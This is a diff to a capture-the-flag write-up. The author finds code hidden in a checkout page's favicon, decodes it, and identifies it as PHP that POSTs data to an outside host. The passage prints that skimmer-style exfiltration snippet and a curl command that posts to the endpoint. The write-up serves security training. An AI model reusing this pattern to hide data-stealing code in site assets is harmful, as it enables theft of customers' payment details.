@@ -41,7 +41,7 @@ Here's the paragraph of interest reproduced from the [article](https://www.darkr
 Looks like I should take a closer look at the _favicon_ and other images downloaded for display on the _checkout.php_ page.
 ___
 
-I downloaded the _favicon.ico_ file from http://wp6p6avs8yncf6wuvdwnpq8lfdhyjjds.ctf.sg:14719/favicon.ico and found that it indeed contained (Javascript) code:
+I downloaded the _favicon.ico_ file from http://wp6p6avs8yncf6wuvdwnpq8lfdhyjjds.ctf.sg:14719/favicon.ico and found that it indeed contained code:
 
 ![image](https://user-images.githubusercontent.com/82754379/139862931-6d0d6e38-167a-4396-aff5-33f38a0bad54.png)
 
@@ -53,7 +53,7 @@ There's a Base64-encoded portion, which I used [CyberChef](https://gchq.github.i
 
 Here is the prettified Javascript:
 
-```javascript
+```php
 $ch=curl_init();
 curl_setopt($ch,CURLOPT_URL,"http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/xcvlosxgbtfcofovywbxdawregjbzqta.php");
 curl_setopt($ch,CURLOPT_POST,1);
@@ -63,4 +63,22 @@ $server_output=curl_exec($ch);
 
 ---
 
+This appeared to be PHP code from the use of the *curl_init()* function (a built-in PHP function).
+
+Accessing the URL `http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/xcvlosxgbtfcofovywbxdawregjbzqta.php` directly simply output the plain text:
+```
+Only those who knows the method is allowed.
+```
+
+I guessed the PHP script responding to the HTTP request was expecting a POST request. <br>
+I tried **curl**:
+
+```bash
+curl -d "14c4b06b824ec593239362517f538b29=Hi%20from%20scada" http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/xcvlosxgbtfcofovywbxdawregjbzqta.php
+```
+
+and got the one-line output:
+```
+New record created successfully
+```
 
